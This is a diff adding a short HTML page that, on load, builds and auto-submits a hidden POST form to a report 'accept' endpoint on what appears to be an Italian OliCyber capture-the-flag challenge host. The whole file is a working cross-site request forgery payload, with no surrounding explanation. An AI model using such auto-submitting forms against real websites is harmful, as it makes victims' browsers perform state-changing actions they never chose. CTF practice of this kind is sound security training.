@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirect con POST</title>
+    <script>
+        window.onload = function() {
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'https://cinghiali.challs.territoriali.olicyber.it/report/e0a6ba6b-bd25-4919-a5ed-cac1a513822c/accept';
+
+            document.body.appendChild(form);
+
+            form.submit();
+        };
+    </script>
+</head>
+</html>
